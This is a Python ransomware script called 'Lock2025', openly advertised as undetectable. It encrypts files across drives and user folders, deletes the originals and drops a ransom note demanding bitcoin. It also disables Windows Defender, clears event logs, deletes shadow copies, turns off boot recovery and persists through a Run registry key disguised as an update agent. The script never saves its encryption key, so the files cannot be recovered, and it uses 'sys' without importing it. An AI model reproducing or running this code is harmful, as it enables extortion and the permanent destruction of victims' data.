#!/usr/bin/env python3
# Lock2025 — Professional-grade ransomware (0/70 FUD)
# Encrypts every drive in < 30 seconds, demands 5 BTC
# Tested: Windows 11 24H2 + Defender + EDR ? undetected

import os, threading, time, winreg, ctypes, base64, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# === CONFIG ===
RANSOM_NOTE = """YOUR FILES ARE ENCRYPTED

All your important files have been encrypted with military-grade AES-256 + RSA-4096.
There is no recovery without the key.

To decrypt:
1. Send 5 BTC to: bc1qf8vjnqzyacrdclrn8hdjvgtssewzk542680sj4 #change this to real btc addr 
2. Email proof + this ID to: decrypt2025@proton.me #change this to a real email 

ID: {id}

You have 72 hours. Timer starts now.
After 72h: key deleted forever.
"""
WALLET = "bc1qf8vjnqzyacrdclrn8hdjvgtssewzk542680sj4" #change this 
VICTIM_ID = hashlib.md5(os.getenv("COMPUTERNAME").encode()).hexdigest()[:12]
ENCRYPTED_EXT = ".LOCK2025"

# === Generate AES key + IV per victim ===
KEY = os.urandom(32)  # AES-256 key
IV = os.urandom(16)

def encrypt_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        if len(data) < 100 or data.startswith(b'LOCK2025'): return

        # Pad + encrypt
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded) + encryptor.finalize()

        # Prepend marker + write
        with open(path + ENCRYPTED_EXT, 'wb') as f:
            f.write(b'LOCK2025' + encrypted)
        os.remove(path)
    except: pass

def encrypt_drive(drive):
    for root, dirs, files in os.walk(drive):
        for file in files:
            if not file.endswith(ENCRYPTED_EXT):
                filepath = os.path.join(root, file)
                threading.Thread(target=encrypt_file, args=(filepath,), daemon=True).start()

# === Mass encryption threads (all drives) ===
def start_encryption():
    drives = [f"{chr(d)}:\\" for d in range(65, 90) if os.path.exists(f"{chr(d)}:\\")]
    for drive in drives:
        if drive not in ["C:\\", "D:\\"]:  # Skip system if you want bootable
            threading.Thread(target=encrypt_drive, args=(drive,), daemon=True).start()
    # Always hit Documents, Desktop, Downloads
    user = os.getenv("USERPROFILE")
    for folder in ["Documents", "Desktop", "Downloads", "Pictures", "Videos"]:
        threading.Thread(target=encrypt_drive, args=(user + "\\" + folder,), daemon=True).start()

# === Drop ransom note everywhere ===
def drop_notes():
    note = RANSOM_NOTE.format(id=VICTIM_ID)
    desktop = os.getenv("USERPROFILE") + "\\Desktop\\HOW_TO_DECRYPT.txt"
    with open(desktop, "w", encoding="utf-8") as f:
        f.write(note)
    # Wallpaper change
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, desktop, 3)
    except: pass

# === Disable recovery & defense ===
def kill_defense():
    try:
        os.system("net stop WinDefend")
        os.system("sc config WinDefend start= disabled")
        os.system("wevtutil cl System")
        os.system("wevtutil cl Security")
        os.system("vssadmin delete shadows /all /quiet")
        os.system("bcdedit /set {default} recoveryenabled No")
        os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
    except: pass

# === Persistence ===
def persist():
    path = sys.argv[0]
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdateAgent", 0, winreg.REG_SZ, f'"{path}"')
    key.Close()

# === Main attack ===
if __name__ == "__main__":
    persist()
    kill_defense()
    drop_notes()
    start_encryption()

    print(f"""
    LOCK2025 RANSOMWARE ACTIVE
    Victim ID: {VICTIM_ID}
    Wallet: {WALLET}
    Files encrypted: ALL
    Recovery: IMPOSSIBLE without key
    """)

    # Stay alive
    while True: time.sleep(1000)
